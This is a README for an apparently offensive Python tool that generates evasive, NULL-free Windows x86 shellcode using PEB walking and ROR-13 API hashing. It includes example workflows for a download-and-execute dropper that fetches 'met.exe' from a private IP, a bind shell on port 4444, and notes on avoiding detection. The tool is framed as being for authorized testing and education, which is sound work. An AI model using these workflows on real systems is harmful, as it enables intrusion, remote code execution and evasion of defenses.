# Windows x86 Shellcode Generator

A comprehensive Python tool for generating position-independent, NULL-byte free Windows x86 shellcode with detailed inline comments and API documentation.

## Overview

This tool generates Windows x86 shellcode that uses advanced evasion techniques including:
- **Dynamic DLL Loading**: Uses PEB (Process Environment Block) walking to locate kernel32.dll
- **API Hashing**: Resolves Windows APIs using ROR-13 hash algorithm instead of direct function names
- **NULL-Byte Free**: All generated shellcode avoids NULL bytes (0x00) for maximum compatibility
- **Position Independent**: No hardcoded addresses, works in any memory location
- **Fully Documented**: Each instruction includes detailed comments explaining what it does and why

## Features

### ✅ Core Capabilities

- **PEB Traversal**: Automatically generates code to locate kernel32.dll via Process Environment Block
- **ROR-13 Hashing**: Implements hash-based API resolution to avoid string detection
- **Multiple Windows APIs**: Support for 12+ Windows APIs including:
  - File Operations: CopyFileA, CopyFileExA, MoveFileA
  - Process Management: CreateProcessA, WinExec, TerminateProcess
  - Network Operations: URLDownloadToFileA (HTTP/HTTPS downloads)
  - Path Resolution: SHGetFolderPathA (CSIDL folder paths)
  - DLL Loading: LoadLibraryA (dynamic library loading)
  - User Info: GetUserNameA, GetUserProfileDirectoryA
  - Network Shells: Bind TCP Shell (ws2_32.dll)

### ✅ Advanced Features

- **Interactive CLI**: User-friendly menu-driven interface for selecting APIs and configuring parameters
- **Comprehensive Documentation**: 
  - C function signatures for all APIs
  - Detailed inline comments for every instruction
  - Hash values displayed for each API resolution
  - Parameter explanations
- **Smart Code Generation**:
  - Automatic offset management
  - Stack frame setup
  - Register preservation
  - Error handling labels (optional)
- **Clean Output Format**: Generates Python code with array-based shellcode format

## Installation

### Prerequisites

- Python 3.6 or higher
- Windows OS (for shellcode execution testing)
- Required Python packages:
  ```bash
  pip install keystone-engine
  ```

### Setup

1. Clone or download the repository
2. Install dependencies:
   ```bash
   pip install keystone-engine
   ```

## Usage

### Basic Usage

Run the generator interactively:

```bash
python generator.py
```

### Interactive Menu

The tool provides an interactive menu where you can:

1. **Select APIs**: Choose from 12 available Windows APIs
2. **Configure Parameters**: Set source/destination paths, URLs, CSIDL values, etc.
3. **Generate Shellcode**: Automatically generates assembly code with comments
4. **Save Output**: Export to Python file for execution

### Available APIs

| ID | API Name | DLL | Description |
|----|----------|-----|-------------|
| 1 | CopyFileA | kernel32.dll | Copy file from source to destination |
| 2 | CopyFileExA | kernel32.dll | Copy file with progress callback |
| 3 | CreateProcessA | kernel32.dll | Create new process |
| 4 | GetUserNameA | advapi32.dll | Get current username |
| 5 | GetUserProfileDirectoryA | userenv.dll | Get user profile directory |
| 6 | MoveFileA | kernel32.dll | Move/rename file |
| 7 | TerminateProcess | kernel32.dll | Terminate current process |
| 8 | LoadLibraryA | kernel32.dll | Load DLL library |
| 9 | Bind TCP Shell | ws2_32.dll, kernel32.dll | Open bind shell on specified port |
| 10 | SHGetFolderPathA | shell32.dll, kernel32.dll | Resolve CSIDL folder and append filename |
| 11 | URLDownloadToFileA | urlmon.dll, kernel32.dll | Download HTTP URL to path from previous step |
| 12 | WinExec | kernel32.dll | Execute downloaded file path from previous step |

### Example Workflow

#### Example 1: Download and Execute Payload

1. Select API `10` (SHGetFolderPathA) - Configure CSIDL (e.g., "desktop") and filename (e.g., "met.exe")
2. Select API `11` (URLDownloadToFileA) - Configure HTTP URL (e.g., "http://192.168.1.100/met.exe")
3. Select API `12` (WinExec) - Executes the downloaded file
4. Select API `7` (TerminateProcess) - Optional: Clean exit
5. Choose `DONE` to generate shellcode

#### Example 2: Copy File to User Path

1. Select API `4` (GetUserNameA) - Get current username
2. Select API `1` (CopyFileA) - Configure source and dynamic user destination path
3. Choose `DONE` to generate shellcode

## Generated Code Format

The generator creates Python code in the following format:

```python
def main():
    code = [
        "start:",  # Entry point label
        "mov ebp, esp;",  # Save current stack pointer
        "add esp, 0xfffff9f0;",  # Allocate stack space (avoid NULL bytes)
        
        # API Resolution with C Function Signature
        "# SHFOLDERAPI SHGetFolderPathA(",
        "#   [in]  HWND   hwnd,",
        "#   [in]  int    csidl,",
        "#   [in]  HANDLE hToken,",
        "#   [in]  DWORD  dwFlags,",
        "#   [out] LPSTR  pszPath",
        "# );",
        "# Return: Stored at [EBP + 0x20]",
        "",
        "# Resolving hash for SHGetFolderPathA: 0x3745c867",
        "push 0x3745c867;",  # Push ROR-13 hash value 0x3745c867 for SHGetFolderPathA function name
        "call dword ptr [ebp+0x4];",  # Call function finder to locate SHGetFolderPathA address in loaded DLL using hash
        "mov [ebp + 0x20], eax;",  # Store resolved SHGetFolderPathA function pointer at [EBP + 0x20] for later use
        ...
    ]
    
    code_str = "\n".join(code)
    shellcode_ptr = asm2shell(code_str)
    
    if shellcode_ptr:
        execute_shellcode(shellcode_ptr)
```

## Technical Details

### PEB Walking

The shellcode locates kernel32.dll by traversing the Process Environment Block:
1. Accesses TEB (Thread Environment Block) via `fs:[0x30]`
2. Reads PEB structure
3. Iterates through loaded modules in `PEB_LDR_DATA.InMemoryOrderModuleList`
4. Identifies kernel32.dll by checking module name length

### ROR-13 Hashing

API resolution uses ROR-13 (Rotate Right 13 bits) hash algorithm:
- Calculates hash for each function name character
- Compares hashes instead of string names
- Bypasses string-based detection mechanisms
- Example: `LoadLibraryA` → `0xec0e4e8e`

### NULL-Byte Avoidance

All operations are designed to avoid NULL bytes:
- Uses arithmetic operations (e.g., `0x41414141 - 0x4141403d = 0x104`) instead of immediate `0x104`
- XOR operations for zeroing registers
- String building on stack with padding bytes

### CSIDL Support

Supported CSIDL folder types:
- `desktop` (0x10): Desktop folder
- `appdata` (0x1a): AppData (User profile)
- `common_appdata` (0x23): ProgramData
- `startup` (0x07): Startup folder
- `startmenu` (0x0b): Start Menu
- `programs` (0x02): Programs folder
- `favorites` (0x06): Favorites
- `fonts` (0x14): Fonts folder
- `templates` (0x15): Templates folder

## Code Structure

### Main Components

1. **ShellcodeGenerator Class**: Core generator with methods for:
   - Base shellcode generation (PEB walk, API resolution setup)
   - Individual API code generation
   - String building without NULL bytes
   - File output formatting

2. **ShellcodeApp Class**: Interactive CLI application:
   - Menu system for API selection
   - Parameter configuration
   - Result display and file saving

### Key Methods

- `generate_base_shellcode()`: Creates PEB walk and function finder code
- `add_api_resolution()`: Resolves API using hash and stores address
- `build_string_no_nulls()`: Builds NULL-terminated strings on stack
- `save_to_file()`: Exports generated code to Python file

## Output Features

### Comprehensive Documentation

Each generated shellcode includes:
- **C Function Signatures**: Complete API signatures with parameter types
- **Hash Information**: Displayed hash value for each API (e.g., `# Resolving hash for LoadLibraryA: 0xec0e4e8e`)
- **Instruction Comments**: Detailed explanation for every assembly instruction
- **Offset Mapping**: Shows where each API address is stored (e.g., `[EBP + 0x14]`)

### Code Quality

- Clean array-based format for easy modification
- Proper indentation and formatting
- Escape sequences for special characters
- Ready-to-execute Python code template

## Security Considerations

⚠️ **DISCLAIMER**: This tool is for educational and authorized security testing purposes only.

### Ethical Use

- Only use on systems you own or have explicit written permission to test
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

### Detection Evasion

The generated shellcode implements several evasion techniques:
- Hash-based API resolution (avoids IAT/string detection)
- Dynamic DLL loading (no hardcoded addresses)
- NULL-byte free (bypasses string scanning)
- Position independent (works in any memory location)

## Limitations

- **x86 Only**: Currently supports 32-bit Windows architecture only
- **Windows Only**: Designed specifically for Windows OS
- **Keystone Dependency**: Requires Keystone Engine for assembly compilation
- **Execution Testing**: Shellcode must be tested on Windows systems

## File Output

When saving, the generator creates a Python file containing:

1. **Helper Functions**:
   - `ror_str()`: ROR algorithm implementation
   - `push_function_hash()`: Hash calculation
   - `asm2shell()`: Assembly to shellcode conversion (Keystone)
   - `execute_shellcode()`: Shellcode execution wrapper

2. **Main Function**:
   - Shellcode array with all instructions
   - Assembly compilation
   - Memory allocation and execution
   - Cleanup code

3. **Execution Template**:
   - Ready-to-run main function
   - Error handling
   - Memory management

## Troubleshooting

### Common Issues

**Issue**: `Keystone not found`
- **Solution**: Install keystone-engine: `pip install keystone-engine`

**Issue**: `Assembly error: Invalid instruction`
- **Solution**: Check generated code for syntax errors, verify all strings are properly escaped

**Issue**: `NULL bytes detected`
- **Solution**: The generator should prevent this automatically, but review arithmetic operations if errors occur

**Issue**: `API resolution fails at runtime`
- **Solution**: Verify DLL is loaded before API resolution, check hash values match target system

## Examples

### Example 1: Basic File Copy

```
Selected APIs:
  1. CopyFileA
     Parameters: src='\\kali\met\', dst='C:\temp\m.txt', fail_exists=False
```

### Example 2: Download and Execute

```
Selected APIs:
  1. SHGetFolderPathA path
     Parameters: csidl=desktop, filename='met.exe'
  2. URLDownloadToFileA
     Parameters: url='http://192.168.1.100/met.exe', dest=[ebp-0x30]
  3. WinExec
     Parameters: lpCmdLine=[ebp-0x30], SW_SHOWNORMAL
```

### Example 3: Bind Shell

```
Selected APIs:
  1. Bind TCP Shell
     Parameters: port=4444, process='cmd.exe'
```

## API Function Signatures

All APIs include complete C function signatures in the generated code:

- **SHGetFolderPathA**: Retrieves special folder paths (Desktop, AppData, etc.)
- **URLDownloadToFileA**: Downloads files via HTTP/HTTPS
- **WinExec**: Executes applications
- **CopyFileA/CopyFileExA**: File copying operations
- **CreateProcessA**: Process creation with full control
- **LoadLibraryA**: Dynamic DLL loading
- And more...

## Contributing

This is a specialized security tool. Contributions should:
- Maintain NULL-byte free code generation
- Preserve position independence
- Include comprehensive documentation
- Follow existing code style

## License

This tool is provided for educational purposes. Users are responsible for ensuring legal and ethical use.

## References

- Windows API Documentation: MSDN
- PEB Structure: Windows Internals
- ROR-13 Hashing: Shellcode techniques
- Keystone Engine: https://www.keystone-engine.org/

## Support

For issues or questions:
1. Review the troubleshooting section
2. Check generated code comments for explanations
3. Verify API parameters are correctly configured

---

